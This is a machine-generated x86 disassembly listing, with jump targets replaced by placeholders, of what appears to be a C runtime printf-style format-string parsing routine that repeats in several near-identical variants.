mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d786
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
cmp eax 0x7
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jmp [ eax * 4 + jump_table_41ee4a ]
mov ecx esi
call sub_41f8a4
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f682
jmp r-xdata
mov ecx esi
call sub_422f0d
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ffe4
jmp r-xdata
mov ecx esi
call sub_420c08
jmp r-xdata
mov ecx esi
call sub_4223f1
test al al
je r-xdata
sub_41ee6a
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_4277b0
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
mov ecx esi
call sub_427d61
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d7ba
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41ef7a ]
mov ecx esi
call sub_41f8c3
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f6bf
jmp r-xdata
mov ecx esi
call sub_422f39
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_42000d
jmp r-xdata
mov ecx esi
call sub_420d84
jmp r-xdata
mov ecx esi
call sub_42264e
test al al
je r-xdata
sub_41ef9a
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_4277b0
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
push edi
mov ecx esi
call sub_41d4f1
test al al
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x18 ]
or edi 0xffffffff
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
mov ecx esi
call sub_427f03
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d7f1
mov ecx esi
mov [ esi + 0x1c ] eax
call sub_427bed
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov ecx esi
call sub_41d4f1
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
cmp eax 0x8
je r-xdata
pop edi
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41f0da ]
mov ecx esi
call sub_41f8e2
jmp r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f6fc
jmp r-xdata
mov ecx esi
call sub_422f65
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_420036
jmp r-xdata
mov ecx esi
call sub_420f00
jmp r-xdata
mov ecx esi
call sub_4228ab
test al al
je r-xdata
sub_41f0fa
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_4277b0
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d828
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
cmp eax 0x7
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jmp [ eax * 4 + jump_table_41f1fa ]
mov ecx esi
call sub_41f913
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f739
jmp r-xdata
mov ecx esi
call sub_422fa6
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_420071
jmp r-xdata
mov ecx esi
call sub_42107c
jmp r-xdata
mov ecx esi
call sub_422b17
test al al
je r-xdata
sub_41f332
mov edx [ ecx + 0x458 ]
cmp edx 0x1
jne r-xdata
cmp edx 0x2
jne r-xdata
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor al al
retn
cmp [ ecx + 0x45c ] 0x0
je r-xdata
mov al 0x1
retn
sub_41f35a
mov edx [ ecx + 0x458 ]
cmp edx 0x1
jne r-xdata
cmp edx 0x2
jne r-xdata
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor al al
retn
cmp [ ecx + 0x45c ] 0x0
je r-xdata
mov al 0x1
retn
sub_41f382
mov edx [ ecx + 0x458 ]
cmp edx 0x1
jne r-xdata
cmp edx 0x2
jne r-xdata
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor al al
retn
cmp [ ecx + 0x45c ] 0x0
je r-xdata
mov al 0x1
retn
sub_41f3aa
mov edx [ ecx + 0x458 ]
cmp edx 0x1
jne r-xdata
cmp edx 0x2
jne r-xdata
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor al al
retn
cmp [ ecx + 0x45c ] 0x0
je r-xdata
mov al 0x1
retn
sub_41f49a
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f4d7
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f514
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f551
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f58e
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f5cb
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f608
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f645
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f682
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f6bf
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f6fc
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f739
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f795
mov edi edi
push esi
mov esi ecx
call sub_41f332
test al al
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_41f95c
test al al
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
pop esi
retn
sub_41f804
mov edi edi
push esi
mov esi ecx
call sub_41f35a
test al al
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_41f9da
test al al
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
pop esi
retn
sub_41f873
mov edi edi
push esi
mov esi ecx
call sub_41f382
test al al
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_41fa49
test al al
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
pop esi
retn
sub_41f8e2
mov edi edi
push esi
mov esi ecx
call sub_41f3aa
test al al
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_41fa9a
test al al
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
pop esi
retn
sub_41f932
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fad0
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4281b4
mov al 0x1
pop esi
retn
pop esi
retn
sub_41f95c
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fb31
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4281b4
mov al 0x1
pop esi
retn
pop esi
retn
sub_41f986
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fb92
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4281b4
mov al 0x1
pop esi
retn
pop esi
retn
sub_41f9b0
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fbf3
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428231
mov al 0x1
pop esi
retn
pop esi
retn
sub_41f9da
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fc54
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428231
mov al 0x1
pop esi
retn
pop esi
retn
sub_41fa04
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fcb5
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428231
mov al 0x1
pop esi
retn
pop esi
retn
sub_41fad0
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_4281b4
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fb31
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_4281b4
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fb92
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_4281b4
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fbf3
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_428231
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fc54
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_428231
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fcb5
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_428231
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fe6c
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41df1e
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_41fe94
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x31 ] 0x2a
je r-xdata
call sub_42743f
test al al
jne r-xdata
lea eax [ esi + 0x28 ]
push eax
call sub_41df7a
pop esi
retn
mov ecx esi
call sub_41f2ce
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x28 ] 0x0
jge r-xdata
or [ esi + 0x28 ] 0xffffffff
sub_41fece
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41dfd6
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_41fef6
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e032
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_41ff1e
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x31 ] 0x2a
je r-xdata
call sub_4274f5
test al al
jne r-xdata
lea eax [ esi + 0x28 ]
push eax
call sub_41e08e
pop esi
retn
mov ecx esi
call sub_41f2e4
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x28 ] 0x0
jge r-xdata
or [ esi + 0x28 ] 0xffffffff
sub_41ff58
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e0ea
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_41ff80
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e146
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_41ffa9
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x32 ] 0x2a
je r-xdata
call sub_4275ab
test al al
jne r-xdata
lea eax [ esi + 0x28 ]
push eax
call sub_41e1a4
pop esi
retn
mov ecx esi
call sub_41f2fa
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x28 ] 0x0
jge r-xdata
or [ esi + 0x28 ] 0xffffffff
sub_41ffe4
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e202
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_42000d
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e260
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_420036
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x32 ] 0x2a
je r-xdata
call sub_427662
test al al
jne r-xdata
lea eax [ esi + 0x28 ]
push eax
call sub_41e2be
pop esi
retn
mov ecx esi
call sub_41f310
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x28 ] 0x0
jge r-xdata
or [ esi + 0x28 ] 0xffffffff
sub_420071
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_41e31c
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_42009a
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_4211f8
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_420203
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_421427
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
